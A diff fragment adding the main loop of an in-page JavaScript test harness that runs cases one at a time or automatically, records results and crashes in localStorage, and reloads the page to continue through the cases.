+  bks('DONE', 'case=' + id + ',tag=' + r.tag + ',detail=' + (r.detail || '').slice(0, 380));
+  say(id + ' -> ' + r.tag + ' ' + (r.detail || ''));
+  render();
+  return r;
+}
+
+async function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('cur'); lsDel('done'); lsDel('res'); lsDel('last');
+    bks('RESET', 'cleared,run=' + RUN);
+    say('cleared. reopen with ?op=auto');
+    render();
+    return;
+  }
+
+  var cur = lsGet('cur');
+  if (cur) {
+    var last = lsGet('last') || '?';
+    appendRes(cur + '|CRASH|last=' + last);
+    markDone(cur);
+    lsDel('cur');
+    lsDel('last');
+    bks('CRASH-DETECTED', 'case=' + cur + ',last=' + last + ',run=' + RUN);
+    say('previous case CRASHED: ' + cur + ' last=' + last);
+  }
+
+  var m = /[?&]case=([^&]+)/.exec(q);
+  var one = m ? decodeURIComponent(m[1]) : '';
+  var auto = (q.indexOf('op=auto') >= 0) || (!one && q.indexOf('case=') < 0);
+
+  if (one) {
+    var rr = await runOne(one);
+    say('single case done: ' + one + ' -> ' + rr.tag);
+    render();
+    return;
+  }
+
+  if (auto) {
+    var id = nextCase();
+    if (!id) {
+      bks('FINAL', 'run=' + RUN + ',res=' + (lsGet('res') || '').slice(0, 440));
+      say('ALL CASES DONE.');
+      render();
+      return;
+    }
+    await runOne(id);
+    setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, 700);
+    return;
+  }
+
+  say('ready. use ?op=auto or ?case=<id>');
+  render();
+}
+
+try { main(); } catch (e) { bks('FATAL', errOf(e)); say('FATAL ' + errOf(e)); }
+</script>
+</body>
+</html>
